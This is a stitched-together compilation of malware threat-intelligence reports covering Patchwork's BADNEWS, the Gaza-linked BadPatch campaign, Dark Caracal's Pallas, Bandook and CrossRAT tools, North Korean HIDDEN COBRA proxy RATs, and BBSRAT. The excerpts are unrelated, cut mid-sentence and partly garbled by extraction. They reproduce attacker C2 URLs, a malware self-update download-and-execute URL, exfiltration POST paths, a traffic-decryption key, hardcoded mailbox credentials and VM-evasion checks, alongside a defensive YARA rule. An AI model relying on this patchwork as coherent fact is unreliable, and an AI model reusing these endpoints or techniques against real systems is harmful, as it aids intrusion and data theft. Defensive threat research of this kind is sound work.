for this string are different from previous versions. For example, in the previous variant of BADNEWS, the victim’s unique identifier was stored under a variable named ‘uid’, the username was stored in a variable named ‘u’, etc. Additionally, the hardcoded version string of ‘1.0’ is different from previous samples.\\nC2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:\\nCommand\\nDescription\\n0\\nKill BADNEWS.\\n4\\nUpload edg499.dat, which includes the list of interesting files. Spawn a new instance of BADNEWS after.\\n5\\nUpload the file specified by the C2.\\n8\\nUpload the TPX498.dat file, which contains the list of collected keystrokes.\\n13\\nCopy file to adbFle.tmp, and upload it to the C2.\\n23\\nTake screenshot, temporarily store it as TPX499.dat, and upload it to the C2.\\n33\\nDownload specified file to %TEMP%\\\\up and execute it in a new process\\nDuring C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP. The following hardcoded URI is used for normal communication with the C2 (note the additional forward slashes):\\n//e3e7e71a0b28b5e96cc492e636722f73//4sVKAOvu3D//ABDYot0NxyG.php\\nIn the event data is uploaded to the attacker, the following hardcoded URI is used (note the use of backslashes):\\n\\\\e3e7e71a0b28b5e96cc492e636722f73\\\\4sVKAOvu3D\\\\UYEfgEpXAOE.php\\nWhen initial pings are sent to the remote server, BADNEWS includes one of the two previously created strings containing the victim’s information. An example request in a sandboxed environment may be seen below:\\nFigure 8 Example request made by BADNEWS\\nTo decrypt the data provided in the POST request, a number of steps are required. First, the attackers include a series of extra ‘=’ and ‘&’ characters within the data stream. Once these are removed, the data is decoded with base64. Finally, the result is decrypted using AES-128 and the following static key (hex-encoded):\\nDD1876848203D9E10ABCEEC07282FF37\\nConclusion\\nThe Patchwork group continues to plague victims located within the Indian subcontinent. Through the use of relatively new exploits, as well as a constantly evolving malware toolset, they aim to compromise prominent organizations and individuals to further their goals. Recent activity has shown a number of lures related to the Pakistan Army, the Pakistan Atomic Energy Commission, as well as the Ministry of the Interior.\\nOne of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server.\\nPalo Alto Networks customers are protected against this threat in a number of ways:\\nTraps blocks the exploit documents witnessed during this campaign\\nWildFire accurately identifies the samples mentioned in this blog as malicious\\nThe Patchwork and BADNEWS tags in AutoFocus may be used for continued monitoring and tracking of this threat.\\nAdditionally, the providers being used for dead drops have been notified.\\nIndicators of

In that research we discussed two new malware families we named KASPERAGENT and MICROPSIA.\\nSince then, we have continued our research into the Command and Control (C2) infrastructure associated with KASPERAGENT and MICROPSIA. This ongoing research lead us to a new Middle Eastern campaign. Our findings from this new campaign include C2 infrastructure, new attack methods, four types of malware (including Android malware), a system for management of stolen victim data and some detail of the actors.\\nIt is notable that our research has shown that this newly-identified attack campaign dates back to at least June 2012, over five years ago.\\nIn this blog, we outline the results of our research into this new campaign so far.\\nFinding the New Campaign\\nOur discovery of this new campaign begins where our previous KASPERAGENT and MICROPSIA research left off.\\nPivoting from Previous KASPERAGENT and MICROPSIA Research\\nOne of the C2 servers we observed in our earlier KASPERAGENT and MICROPSIA research was mailsinfo.com. The first IP address that this domain resolved to from about mid-May 2015 through October-November 2015 was 148.251.135.117.\\nWe used passive DNS (pDNS) and found the server mail.pal4u.net on 148.251.135.117 starting mid-May 2015. We also found other servers on this IP address. We do not believe this necessarily gives a link between campaigns found on this IP address as it appears to be shared by multiple unrelated third parties. However, the nature of activity and some malware artifacts on this IP address does suggest a possible link to the Gaza Hackers group.\\nC2 Infrastructure\\nAs we followed our leads from the previous KASPERAGENT and MICROPSIA research and dug into the server mail.pal4u.net on 148.251.135.117 that research led us to find the C2 infrastructure of this new campaign.\\nDigging into Pal4u\\nThe WHOIS for pal4u.net appears to be a Palestinian hosting company. The DNS records for pal4u.net gives us, in addition to the “WWW” hostname, the Name Servers (NS) “NS1” and “NS2” and additional IP address 195.154.216.74.\\nWe found six additional domains that used palu4u.net as NS, and which all shared the same historic IP address 195.154.216.74 (Figure 2). From the seven total domains, we observed six as malware Command & Control (C2), exfiltration, malware download servers, and/or in associated malware code:\\nPal4u.net\\nPal2me.net\\nPay2earn.net\\nShop8d.net\\nTs4shope.net\\npal4news.net\\nWe only found one of the seven domains associated with this IP, ads4market.net, not associated with malware activity. We did not find any legitimate activity or content associated with these six domains during the period of associated registration.\\nFigure 1- C2 domain links\\nWhile there is historic WHOIS for pal2me.net and shop8d.net, research into the registrant information suggests this is related to the ISP rather than the actors using the site for C2.\\nWe also found the DNS RNAME “a.faris.live.com” was used, but this also seems to be related to the host ISP rather than the site owner.\\nUnderstanding that we were looking at a collection of linked malware C2 servers, we started to look into the attacks methods and malware that used this infrastructure.\\nAttack Methods\\nWe observed initial attacks using this infrastructure were against victims via spear phishing. However, for the first time in any known Gaza Hackers-linked campaign, we also found a limited use of vulnerability exploits – RTF exploit CVE-2012-0158 documented by Citizenlab (Part 3 – “The Curious Case of the Shared Exploit”). The attackers used the RTF exploit to download their “BadPatch” Windows malware from hacked WordPress site wp.piedslibres.com/wp/wp-includes/js/Next.scr.\\nSHA256\\nd759dcbebee18a65fda434ba1da5d348c16d9d3775fe1652a1dacf983ffc93b8\\nFirst seen\\n2015-05-13\\nFilename\\nلمستجدات.doc , (Developments.doc)\\nWe found a second attack sample that used the same exploit, that also downloaded the same malware from the compromised server.\\nFilename\\n6660491190525a7413b683b91a6c8b0082aa71e6dd6291d11ec26e1e3cf55a57\\nFirst seen\\n2015-06-15\\nFilename\\nتسنيم.doc (Tasneem.doc – the military organization of Fatah (political Palestinian movement))\\nIn most of the attacks we observed the malware will display a blank Microsoft Word decoy file, or a Microsoft Word file with error message:\\n“An error occurred, please try your request again later“.\\nWe did observe some variations in this attack. The first malware sample that we identified (compiled on 12 June 2012) dropped an Adobe Flash decoy file (Figure 2):\\nSHA256\\n92a685c0c8515ef55635760026039564ddd0b299a2b0c4812df3c40aba133812\\nFigure 2- Adobe Flash decoy\\nSamples typically employ decoy filenames tailored to the spear-phished target:\\nSHA256\\n30282a807c2ee27b0d1dda310e41487f5018bc5fc5df8af6c13d08df34f2b6df\\nFilename\\nعاجل جدا وسري جدا.gz (Very urgent and very confidential.

Some mailbox examples:\\nuser: sender_b@pal4u.net\\npassword: sender@123\\nubuntu_net@pal4u.net\\nubuntu_send@pal4u.net\\nFigure 3- SMTP encryption settings\\nThe list of files for exfiltration are written to the malware folder as “sysfiles.txt”. A file “1.done” is generated with content “done” after successful exfiltration. The file “mac.txt” contains the computer MAC address. Some versions exfiltrate recent files, others collect and exfiltrate files matching a hardcoded extension list:\\n*.xls;*.xlsx;*.pdf;*.mdb;*.rar;*.zip*.doc;*.docx\\nAutoIt Malware\\nWe observed a shift from Visual Basic to\\xa0 AutoIt malware in this campaign around March 2016. AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general-purpose scripting.\\nThis malware achieves persistence by writing to “%appdata%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Microsoft.lnk” using the WScript object.\\nIt attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard:\\nChecks for processes “VBoxService.exe”, “VBoxTray.exe”, “VMwareTray.exe”\\nWMI query on Win32_DiskDrive, looking for “VBOX HARDDISK”,”QEMU HARDDISK”,”VMWARE VIRTUAL IDE HARD DRIVE”, “VMware Virtual S SCSI Disk Device”\\nWMI query on Win32_BIOS “Found Vbox BIOS version”\\nWMI query on Win32_Baseboard “Found VMware-style motherboard”, “440BX Desktop Reference Platform”. Name=”Base Board”\\nThe malware deletes Chrome and Firefox cached password files, requiring the user to re-enter site passwords, affording the keylogger the opportunity to capture them.\\nThe malware can be instructed to kill the malware process by Process ID, or by hardcoded name.\\nIt can update itself by downloading and executing a newer version:\\nh__p://m103.pay2earn.net/public/versions/“svchost” & $i & “.zip (where i=1 to 7).\\nThe new version is saved at\\xa0%appdata%\\\\Microsoft\\\\updte\\\\svchost.scr.\\nEnvironment data exfiltration via POST\\nIt will perform a WMI query to enumerate installed security products.\\nIt stores data in log files:\\nSpecific attacker username stored at %appdata%\\\\Microsoft\\\\updte\\\\usu.log\\nMAC address %appdata%\\\\Microsoft\\\\updte\\\\mac.log\\nErrors are logged at \\xa0%appdata%\\\\Microsoft\\\\updte\\\\log.log\\nThis data is exfiltrated along with Operating System version and architecture using HTTP POST:\\nh__p://m103.pay2earn.net/devices/settings\\n/devices/settings?mac_address=<macAddress>&content=%20Start%20Downloader%20majdTest%201/2017Anti%20Type:%20%20%20OS%20Version%20=%20WIN_7%20|%20X64\\nh__p://m103.pay2earn.net/logs/new\\n/logs/new?name=<computerName>$&computer_id=App.EXEName&mac_address=<macAddress>&content=$%20Start%20Downloader%20%20majdTest%201/2017&patch_username=majd\\nScreenshots via SMTP\\nThe malware takes screenshots on the victim computer, exfiltrating them using SMTP (port 26) as “GDIPlus_Image1.jpg” and “GDIPlus_Image2.jpg”.\\nThe SMTP configuration is saved as encrypted RC4 strings, decrypted with password !@#$%^&*()\\nFigure 4- SMTP RC4 encrypted strings init\\nMail is sent, in this example, using the string “Start Downloader majdTest 1/2017”.\\nFigure 5- SMTP mail sending function\\nThe emails are sent from an email address at the C2 server, to a recipient address on the same server.

Another outlier variant was keylogger-only, supporting intercepting only Arabic and English characters (42adec426addf3fd0c6aff406b46fa82d901f5a9bed7758a243458961349a362).\\nAutoit downloader /

their targets.\\nAs well as the typical ability to update the malware, this Android malware collects and exfiltrates device files, SMS messages, voice calls, and can also be used to remotely record sound or video using the device. A follow-up blog will examine this malware in detail.\\nRecords Management System and Victims\\nThe threat actors have developed their own, custom system to manage the data exfiltrated by their victims, “نظام إدارة السجلات” (“Records Management System”). Server logon requires 2-Factor authentication (2FA).\\nFigure 7- RMS SMS 2FA\\nFigure 6- RMS Logon Screen\\nDuring the course of our research, we observed a newly introduced bug in their authentication. Navigating directly to the page “sms.php” bypassed the initial password entry requirement, taking us directly to the SMS verification page (Figure 6).\\nFurther, we discovered that navigating directly to “/lms/index.php” no longer redirects the user to login.php, but instead granted authenticated access to the system.\\nFigure 8- Records Management System\\nThis allowed us to enumerate the victims contacting the exfiltration server (Figure 9,) through March 2016.\\nFigure 9- Victims by country\\nAs reflects the nature of campaign, we notice a small overall number of victims. That the majority of victims appear domestic is also not unusual in such campaigns, although we also noted the actor infecting their own test machines in some cases (Figure 10).\\nFigure 10- Testing Logs\\nThe Adversary\\nWe find some hints in sample filenames, Microsoft Visual Project directory names, and HTTP POST parameters, suggesting the names of some of the actors involved in this campaign, and a possible link to an official Gaza Bureau.\\nS:\\\\sh\\\\work files from shaaban\\\\4shopfiles tajas\\\\shop8d\\\\Project1.vbp\\nC:\\\\Documents and Settings\\\\HADJYOUB.HADJ-1065B94515\\\\Bureau\\\\cm\\\\Project1.vbp\\nPossible nickname strings that we observed include:\\nShaaban, Hadjyoub, OMR, mgh2, rashed, Shady, majd , f2b, jno, ajr , hmg, vip, 2ta, asf, h2m, mag\\nNaming\\nThe actors appear to name this malware “Patch”:\\n“\\\\2014-03-17\\\\exe\\\\gaza\\\\Project1.vbp”\\nV:\\\\Batch Versions\\\\\\nIn Arabic, “P” and “B” are phonetically similar, leading to common B/P misspellings.\\nEmbedded strings:\\n“Old – update patch and check anti-virus.. ”\\n“PatchNotExit– Check Version”\\n“PatchNotExit– download now”\\n“PatchNotExit– Version Patch“\\nServer communication parameters:\\nlms/getdata.php?myAction=add_line&macName=…$&computer_id=App.EXEName&mac_address=…&dns_domain=nnn&domain=bbb&content2=$FRESH:%20%20ESC%20pango2012ENTR&ver=3&mac_time=tt&patch_user_id=mgh2&patch_group_id=Label1(2).Caption\\nThe “patch_user_id” parameter appears to refer to the individual actor managing this victim.\\nAge of Campaign\\nThe oldest sample we observed has a compile date of 12 June 2012.

previously documented campaign, led us to another possibly unrelated campaign, crossing paths in hosting.\\nThis allowed us to uncover a previously unknown C2 and exfiltration infrastructure, associated malware, and the first time that we’ve observed this group using exploits.\\nThe simplicity of the malware and relative unsophistication of C2, exfiltration and stolen data management belies the demonstrated fact that this very targeted, low-volume campaign has been working fine for these actors for five years, and continues today.\\nCoverage\\nPalo Alto Networks customers are

The actor has been observed making use of desktop tooling, but has prioritized mobile on a global scale. 2 of writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At Dark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military associated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions during this investigation. Types of data include documents, call records, audio recordings, secure messaging client content, contact information, text messages, photos, and account data. The joint Lookout-EFF investigation began after EFF released its Operation Manul report , highlighting a multi-platform espionage campaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev™s regime in Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android component. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same infrastructure is likely shared by multiple actors and is being used in a new set of campaigns. The diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used simultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has given no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the infrastructure found to be hosting a number of widespread, global cyber-espionage campaigns. Since 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world. activity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted using this infrastructure. 1 2 remained hidden for so long.

The report cites evidence showing that the GDGS, along with other state actors around the world, had active campaigns using FinFisher infrastructure and tools. However, the report did not specify whether the spyware used was the mobile version of FinFisher. Our investigation resulted in the discovery of at least one FinFisher implant for Android, which corroborates Citizen Lab™s previous research. The sample™s hash is provided in the appendix of this report. We also uncovered new desktop surveillance software developed potentially by Dark Caracal themselves, a developer associated with the GDGS, or a private contractor group. nation-state actor compromising the devices of military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions. Our review and appropriate government authorities, industry partners and the public at large. 4 5 5Locating Attacker Facilities We correlated information from test devices and Wi-Fi networks to determine the location of Dark Caracal™s facilities. Test Devices and C2 infrastructure work correctly. Identifying these devices helped us to determine Dark Caracal™s likely location inside the GDGS building. Distinguishing between test and target devices can be tricky. After analyzing data from the infrastructure, we noticed that a subset of the compromised devices contained similar email, Viber, Primo, Telegram, and Whatsapp accounts. These data points allowed us to focus on a select few devices that were unique among the thousands we saw. Additionally, these devices contained a minimal application data, which led us to conclude they were likely test devices.

Knowing that Wi-Fi networks can be used for Bld3F6 . Using the Wi-Fi geolocation service Wigle.net we saw these test device Wi-Fi networks mapped to Beirut. We also noticed Wi-Fi networks with SSID Bld3F6 mapped near the General Security building in Beirut, Lebanon.

Rami Jabbour appears to be in close proximity to where we have seen test devices in Beirut. Figure 5: Aliases associated with the op13 email address 9 Throughout this investigation, Lookout and EFF researchers have gained unique insight into the global operations of Dark Caracal. This has primarily been possible due to command and control infrastructure operators allowing public access to data stolen from compromised devices and systems. infected devices. This demonstrates that Dark Caracal is likely running upwards of six distinct campaigns in parallel, some of which have been operational since January 2012. *****Bookmarks & Browsing History InstalledApplications AudioRecordings AccountInformation Call Records Contacts ImagesSMSMessagesWhatsApp, Telegram and Skype databases Legal and Corporate Documentation File and Directory ListingsWi-Fi DetailsFigure 6: Not only was Dark Caracal able to cast its net wide, it was also able to gain deep insight into each of the victim™s lives. It did this through a series of multi-platform surveillance campaigns that began with desktop attacks and pivoted to the mobile device. Stolen data was found to include personal messages and photos as well as corporate and legal documentation. In some cases, screenshots from its Windows malware painted a picture of how a particular individual spent his evenings at home. 10We found the largest collection of data from a single command and control server that operated under the domain adobeair. net . Over a short period of observation, devices from at least six distinct Android campaigns communicated with this domain Victims were found to speak a variety of languages and were also from a wide range of countries. We discovered messages and photos in Arabic, English, Hindi, Turkish, Thai, Portuguese, and Spanish in the examined data.

This includes recorded audio, call logs, conversations from popular When a Dark Caracal operator instructs an infected device to upload sensitive data, it is stored on the attacker infrastructure under this campaign. While investigating this adversary, we observed content distributed across six different campaigns. In this report, we refer to these campaigns by the name of the directory to which infected devices uploaded victim data.

Mobile tools include a custom written Android surveillanceware implant Lookout named Pallas 9 and a previously unknown FinFisher sample. The group™s desktop tools include the Bandook malware family and a newly discovered desktop surveillanceware tool that we have named CrossRAT, which is able to infect Windows, Linux, and OS X operating systems. The Initial Compromise Figure 15: The Android malware infrastructure is designed to attract victims into the campaign through two different mechanisms: phishing campaigns that separately lead to a watering hole to accept credentials via a spoofed login 9 Pallas™ Cat is another name for ﬁManul,ﬂ a reference to EFF™s Op Manul campaign on this actor Dark Caracal relies primarily on social engineering via posts on a Facebook group and WhatsApp messages in order to compromise target systems, devices, and accounts. At a high-level, the attackers have designed three different kinds of phishing messages, the goal of which is to eventually drive victims to a watering hole controlled by Dark Caracal. 18The group distributes trojanized Android applications with the Pallas malware through its downloads include fake messaging and privacy- oriented apps. There is also some indication that Dark Caracal has used physical access in the past to install the Android malware. Figure 16: Figure 17: A text message found from a possible victim™s device 19Social Engineering and Spear-Phishing Dark Caracal uses phishing messages through popular applications, such as WhatsApp, in order to direct people to the watering hole. Dark Caracal infrastructure hosts phishing sites, which look like login portals for well known services, such as Facebook, Twitter, and Google. We found links to these pages in numerous Facebook groups that included ﬁNanysﬂ in their titles. These groups are listed in the appendix. Figure 18: Left: Extracted from WhatsApp messages database Right: Facebook group links to watering hole Figure 19: Dark Caracal credential phishing portals 20 phishing domains dating to the mid-to-late 2016 time period from this data. We believe the attackers used these phishing servers to capture login credentials, hijack accounts, and to push out more spoofed messages to widen their pool of victims. Phishing links posted in Dark Caracal linked Facebook groups include politically themed news stories, links to fake versions of popular services, such as Gmail, and links to trojanized versions of WhatsApp. Figure 20: Figure 21: Dark Caracal phishing links posted on Facebook 21 communication with victims and build a rapport before directing them either to content on the ﬁNanysﬂ Facebook groups Surveillanceware Š Mobile Capabilities Pallas Š Dark Caracal™s Custom Android Samples Manul campaign 10.

Analysis into Dark Caracal™s is using new variants of the Bandook family. Bandook variants belonging to this family. Written in Delphi and targeting Windows operating systems, Bandook samples are packed at multiple stages in order to both evade detection and slow down the process of reverse engineering by security analysts.

Below is the plaintext of some of these strings, which we can see as Windows API calls. 20 SHA256 hash: ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532 32The malware uses these API calls to decrypt Bandook™s second stage, an embedded resource. This resource is a randomly named eight-character string of uppercase letters and numbers. During our research, we only observed the numbers two and three being used and these were often positioned towards the end of the string. Following the decryption of the second stage, the iexplore.exe binary is started and immediately replaced with the loaded resource. This is a technique known as ﬁprocess hollowing 21ﬂ. Ahmed18ﬂ. Not all second stages were packed indicating that the authors may be actively developing the malware. As expected, the core malicious functionality resides in the second stage, which attempts to implant itself in the system and contact command and control infrastructure for further instructions. At this point, the malware has the ability to start new processes, manipulate the get window names, and beacon to infrastructure. 21 Figure 25: Decoded strings from the Bandook sample 33Bandook communication with attacker infrastructure takes place over a TCP port with HTTP payloads Base64 encoded and Instructions sent from Dark Caracal infrastructure to Bandook compromised systems make use of ﬁ~!ﬂ as a delimiter, the same approach used by the Pallas Android malware. This suggests there is a possibility Bandook and Pallas were written by the same author or that the author of one was inspired by the authors of the other.

Summary Description FBI has high confid ence that HIDDE N COBRA actors are using malware variants in conjunction with proxy servers to maintain a pre sence on victim networks and to further net work exploitation. DHS and FBI are distributing this MAR to enable network defense and reduce exposure to North Korean government malicious cyber activity. This MAR includes malware descriptions re lated to HIDDEN COBRA, suggested response actions and recommended mitigation technique s. Users or administrators should flag activity associated with the malware, report the ac tivity to the DHS Na tional Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give the activity the highest priority for enha nced mitigation. The following YARA signature can be used to detect the proxy servers and RATs: rule Unauthorized_Proxy_Server_RAT { meta: Author=\"US-CERT Code Analysis Team\" Incident=\"10135536\" MD5_1 = \"C74E289AD927E81D2A1A56BC73E394AB\" MD5_2 = \"2950E3741D7AF69E0CA0C5013ABC4209\" Info=\"Detects Proxy Server RAT\" super_rule = 1 strings: $s0 = {8A043132C288043125FF00000003C299F73D40404900A14440490003D0413BCF72DE5E5FC3} $s1 = {8A04318844241432C28804318B44241425FF00000003C299F73D40404900A14440490003D0413BCF72D65E5FC3} $s2 = {8A04318844241432C28804318B44241425FF00000003C299F73D5C394100A16039410003D0413BCF72D65E5FC3} $s3 = {8A043132C288043125FF00000003C299F73D5C394100A16039410003D0413BCF72DE5E5FC3} $s4 = {B91A7900008A140780F29A8810404975F4} $s5 = {399FE192769F839DCE9F2A9D2C9EAD9CEB9F D19CA59F7E9F539CEF9F 029F969C6C9E5C9D949FC99F} $s6 = {8A04318844241432C28804318B44241425FF00000003C299F73D40600910A14460091003D0413BCF72D65E5FC3} TLP:WHITE US-CERT MAR-10135536-B 2 of 12 TLP:WHITE $s7 = {3C5C75208A41014184C074183C72740C3C7474083C6274043C2275088A41014184C075DC} $s8 = {8B063D9534120077353D59341200722E668B4604663DE8037F24} $s9 = {8BC88B74241CC1E1052BC88B7C2418C1E1048B5C241403C88D04888B4C242083F9018944240C7523} $s10 = {8B063D9034120077353D59341200722E668B4604663DE8037F246685C0} $s11 = {30110FB60148FFC102C20FBEC09941F7F94103D249FFC875E7} $s12 = {448BE8B84FEC C44E41F7EDC1FA038BCAC1E91F03D16BD21A442BEA4183C541} $s13 = {8A0A80F9627C2380F9797F1E80F9647C 0A80F96D7F0580C10BEB 0D80F96F7C0A80F9787F05} condition: any of them } Files Processed 70137f688436c468d43b3e50878ec1a1f (0137F688436C468D43B3E50878EC1A1F) 114d8db4843748d79861b49343c8b7ca (114D8DB4843748D79861B49343C8B7CA) 2950e3741d7af69e0ca0c5013abc4209 (2 950E3741D7AF69E0CA0C5013ABC4209) 964b291ad9bafa471da3f80fb262dbe7 (964B291AD9BAFA471DA3F80FB262DBE7) 9e4d9edb07c348b10863d89b6bb08141 (9E4D9EDB07C348B10863D89B6BB08141) c74e289ad927e81d2a1a56bc73e394ab (C74E289AD927E81D2A1A56BC73E394AB) fc9e40100d8dfae2df0f30a3414f50ec (FC9E40100D8DFAE2DF0F30A3414F50EC) TLP:WHITEUS-CERT MAR-10135536-B 3 of 12 TLP:WHITE Files C74E289AD927E81D2 A1A56BC73E394AB Details Name C74E289AD927E81D2A1A56BC73E394AB Size 675840 Type PE32 executable (GUI) Intel 80386, for MS Windows MD5 c74e289ad927e81d2a1a56bc73e394ab SHA1 771f7d69a476d5b0b7c942bdc21e86691dabba89 ssdeep 12288:NxZ0n+1OzKZDK+xgYDUWfVUBXfJFzLlrpoqR:a+EzUfVUNfPz9poq Entropy 6.65567602919 Antivirus K7 Trojan ( 700000041 ) Cyren W32/Heuristic-KPP!Eldorado VirusBlokAda BScope.Trojan.Agent PE Information Compiled 2016-06-21T05:56:00Z PE Sections Name (header) .text .rdata .data MD5 f4c5b7ebe0ffb8c5d5632877552f2e23 d2cf27a072c85308a12b834aa3150af0 bc433c07b82c684a09d26e014c0cefdb 1cfe81260eb717a1b917d7b3d1349851 Raw Size 4096 442368 159744 69632 Entropy 0.649735689975 6.63294155589 6.13100276138 4.94697538055 Packers Name Microsoft Visual C++ v6.0 Version NA Entry Point NA Description This artifact is a malicious PE32 executable that allows a remo te operator or a server to perform various remote operations. Wh en executed, the malware binds to the victim system and listens to activity on port 110. Static analysis of this application indicates that its primary purpose is to force a compromised system to func tion as a proxy server for Internet connections. This capability enables an operator to securely access the Internet through the compromised host. Data to and from the victim system is encoded to prevent identification of th e proxy sessions by firewalls or network analysis devices. Analysis of the cipher algorithm indicates it uses a four-byte key. When the co mpromised system operating as a proxy server rec eives an initial connection from the operator, it expec ts to receive the four-byte key. The ma lware accepts six additional bytes, which is decoded by using the cipher and the previously received four bytes. The malw are verifies the first four bytes received from the operator a re between the values 00123459h and 00123490h. If the first four bytes do not fall bet ween these values, the malware terminates the session wi th the operator. If the first four of these six bytes are between the specified values, t he malware accepts the additional data. From the previous six bytes of data, the fi fth and sixth byte are used to make up a double word va lue, which is used to ident ify the size of the data the malware expects to arrive next. If the double word value is larger than 1,000 bytes, the malware will terminate the connection. Analysi s indicates this is a safety mechanism built into the software to protect it from buffer or heap sprays.

When the file installs, the malware will expe ct the \"SYSTEM\\\\\\\\CurrentControlSet\\\\\\\\Contro l\\\\\\\\LSA = Security Packagesﬂ registry key to be configured properly before loading the DLL onto the operating syst em as a security package. Analysis suggests an external loade r application was used to load this DLL. The malware searches the system for configuration data by checki ng for the presence of the regist ry key \"SOFTWARE\\\\\\\\Microsoft\\\\\\\\Q nuimh = DataPath\". If the registry key is not found, the malware attemp ts to read a file named \"system 32\\\\\\\\msncf.dat\" to access the conf iguration data. If neither the regist ry key or .dat file are found, the malware\\'s main thread does not execute. Static analysis of the main thread reveals it is designed to provide C2 of the infected system to a remote operator. This file uses a cipher and authentication method similar to that of files C74E289AD927E81D2A 1A56BC73E394AB and 114D8D B4843748D79861B49343C8B7CA. The malware uses the OpenSSL library to provide an additional la yer of SSL encryption to the communications between the operato r and malware. This SSL encryption is used in addition to the cipher . The RAT provides the ability to exfiltrate and upload files to and from the compromised system and terminate processes. It also provides the ability to upload and execute secondary payloads. The OpenSSL library and XOR cipher will protect the data uploaded a nd exfiltrated by the RAT. No hard coded C2 s were found in the DLL. However, a c ommon Domain Generation Algorithm was identified, indicating the malw are dynamically generates a domain from the current date and tim e. 964B291AD9BAFA471DA3F80FB262DBE7 Details Name 964B291AD9BAFA471DA3F80FB262DBE7 Size 95232 Type PE32+ executable (DLL) (GUI) x86-64, for MS Windows MD5 964b291ad9bafa471da3f80fb262dbe7 SHA1 350778fc552918dddf84ea3a4c956e9996afe0d5 ssdeep 1536:wMfUQwrWeCIpgfAkbU/cnI IytNvMv5K9gnaCrq+gNvw1hqBgOleTNjw2pS9:wMsQLIp6bU/cn7eI49lCrq/pwOBgOle8 Entropy 6.10686715126 Antivirus nProtect Trojan/W64.Agent.95232 McAfee Trojan-FLDA!964B291AD9BA ClamAV Win.Trojan.Agent-6319549-0 Ahnlab Trojan/Win64.Dllbot Quick Heal Trojan.Generic PE Information Compiled 2014-03-04T09:43:53Z PE Sections Name MD5 Raw Size Entropy (header) ab32b3c672765e57e0892dc1f046728a 1024 2.72686979002 .text 4aef9d49dc3fe0af76cecb93904875c0 65024 6.26878660906 .rdata 720f2fd596b0523ad6da7864337a3e3a 15360 5.47919921082 .data 03e0ab7f93b56899460fda790387d7c1 8192 4.15642395322 .pdata 324652d914c29aa7a7081d418add47dc 3584 4.70286078328 .rsrc f5391c0baa8c69ab8fc159089099c8c4 1536 4.39600332665 .reloc 2de998d058c83ca559bc6a4b4b4d40b6 512 1.93486789339 Description This artifact is a malicious 64-bit DLL.

      "'BBSRAT Attacks Targeting Russian Organizations Linked to Roaming Tiger\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nBBSRAT Attacks Targeting Russian Organizations Linked to Roaming Tiger\\n138,999\\npeople reacted\\n0\\n10\\nmin. read\\nShare\\nBy Bryan Lee and Josh Grunzweig\\nDecember 22, 2015 at 5:00 PM\\nCategory: Malware, Unit 42\\nTags: AutoFocus, BBSRAT, Microsoft Office, PlugX, Roaming Tiger\\nIn late 2014, ESET presented an attack campaign that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed “Roaming Tiger”. The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family.\\nESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing. Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December.\\nThe adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture. We have named this tool “BBSRAT.”\\nTargeting and Infrastructure\\nAs described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system. The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems.\\nFigure 1 Spear-phishing email delivering BBSRAT\\nIn one case, the adversary impersonated an individual from the organization Vigstar, a Russian-based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federation’s defense and security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar.\\nThe rough translation of the body of the email is as follows:\\nI send you a “list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states.” Waiting for your reply!\\nFigure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015.\\nFigure 2 Decoy document that is opened after the malicious document has infected the system\\nIn more recent months, we have identified several other potential Russian victims using AutoFocus. Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the “Roaming Tiger” campaign, including transactiona.com and futuresgold.com. Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for each of the intended targets.\\nFigure 3 Command and control infrastructure\\nBBSRAT Malware Analysis\\nDeployment Technique #1\\nBBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated filename is 10-16 uppercase alphabetic characters, and ends with a ‘.TMP’ file extension. The dropper will continue to write an embedded cab file in this location.\\nFigure 4 Header of CAB file dropped by BBSRAT\\nThe malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:\\n%ALLUSERSPROFILE%\\\\SSONSVR\\n%ALLUSERSPROFILE%\\\\Application Data\\\\SSONSVR\\nUsing the built-in 